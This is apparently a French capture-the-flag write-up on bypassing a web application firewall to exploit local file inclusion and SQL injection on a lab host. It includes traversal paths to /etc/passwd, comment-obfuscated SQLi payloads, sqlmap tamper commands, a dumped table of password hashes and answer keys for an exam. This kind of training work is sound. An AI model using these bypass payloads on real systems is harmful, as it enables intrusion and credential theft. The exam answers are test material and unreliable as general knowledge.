# Writeup : WAF Bypass Techniques - Tritonsite.hv

## Introduction

Ce challenge consiste à analyser et exploiter une application web protégée par un Pare-feu Applicatif (WAF). L'objectif est de contourner les protections du WAF pour exploiter des failles de type **Local File Inclusion (LFI)** et **SQL Injection (SQLi)** afin de récupérer des informations sensibles.

---

## 1. Énumération et Reconnaissance

La première étape a consisté à identifier la cible et les points d'entrée.

* **Cible :** `http://tritonsite.hv`
* **Technologie :** Serveur Apache/2.4.52 (Ubuntu).
* **Points d'entrée identifiés :**
  * `http://tritonsite.hv/vuln/lfi/` (Paramètre `page`)
  * `http://tritonsite.hv/vuln/sqli/` (Paramètre `id`)

Une analyse rapide montre que les tentatives classiques d'exploitation (comme l'utilisation de `../` ou de mots-clés SQL `UNION SELECT`) sont bloquées par le WAF avec une erreur **403 Forbidden**.

---

## 2. Exploitation de la faille LFI (Local File Inclusion)

### Tentatives infructueuses (Bloquées par le WAF)

Le WAF surveille les séquences de navigation de dossiers :
* `../../../../etc/passwd` -> **403 Forbidden**
* `php://filter/read=convert.base64-encode/resource=...` -> **403 Forbidden**

### Contournement (Bypass)

Après plusieurs tests de techniques de contournement (double encodage, obfuscation de chemin), il a été découvert que le WAF était particulièrement sensible aux séquences `../`. Cependant, il n'empêchait pas l'accès via un chemin absolu si celui-ci ne contenait pas de patterns suspects.

**Commande réussie :**

```bash
curl "http://tritonsite.hv/vuln/lfi/?page=/opt/sensitive_file"
```

**Résultat :**
`"The unexamined life is not worth living." - Socrates`
L'auteur est donc **Socrates**.

---

## 3. Exploitation de la faille SQL Injection (SQLi)

### Analyse du WAF

Le WAF bloque les requêtes contenant des mots-clés SQL courants séparés par des espaces standards.
* `1' UNION SELECT 1,2--` -> **403 Forbidden**

Un premier bypass manuel a été identifié en utilisant des commentaires SQL pour remplacer les espaces :
* `1'/**/UNION/**/SELECT/**/1,2#` -> **200 OK**

### Automatisation avec SQLMap

Pour une extraction complète des données, nous avons utilisé `sqlmap` avec des scripts de **tamper** pour automatiser le contournement du WAF.

**Scripts de tamper utilisés :**

1. `versionedmorekeywords` : Enrobe les mots-clés dans des commentaires de version MySQL.
2. `space2comment` : Remplace les espaces par `/**/`.

**Commande d'extraction des bases de données :**

```bash
sqlmap -u "http://tritonsite.hv/vuln/sqli/?id=1&Submit=Submit" --batch --tamper=versionedmorekeywords,space2comment --dbs
```

**Résultats :**
* Base de données : `vuln`
* Utilisateur actuel : `vuln@localhost`
* Tables dans `vuln` : `comments`, `info`, `users`

**Extraction des données de la table `users` :**

```bash
sqlmap -u "http://tritonsite.hv/vuln/sqli/?id=1&Submit=Submit" --batch --tamper=versionedmorekeywords,space2comment -D vuln -T users --dump
```

**Données récupérées :**

| id | user | last_name | first_name | password (hash) |
|----|------|-----------|------------|-----------------|
| 1  | admin | admin | admin | 5fcfd41e547a12215b173ff47fdd3739 |
| 2  | spenser | Spenser | Edmund | 21b72c0b7adc5c7b4a50ffcb90d92dd6 |
| 3  | dante | Alighieri | Dante | f25a2fc72690b780b2a14e140ef6a9e0 |
| 4  | jmilton | Milton | John | **fbeba4d148ad01662c6e505762ecb1ee** |

---

## 4. Réponses au Final Exam

* **Question 6 (Auteur de la citation) :** Socrates
* **Question 7 (Nom de la DB) :** vuln
* **Question 8 (Utilisateur DB) :** vuln@localhost
* **Question 9 (Nombre de tables) :** 3
* **Question 10 (Nombre d'utilisateurs) :** 4
* **Question 11 (Hash de jmilton) :** fbeba4d148ad01662c6e505762ecb1ee

---

## 5. Conclusion

Le challenge a démontré que la sécurité par WAF ne remplace pas une correction de code à la source. Bien que le WAF bloquait les payloads "simples", l'utilisation de techniques d'encodage et d'obfuscation de chemins (LFI) ainsi que l'usage de commentaires SQL (SQLi) a permis de contourner totalement les protections.
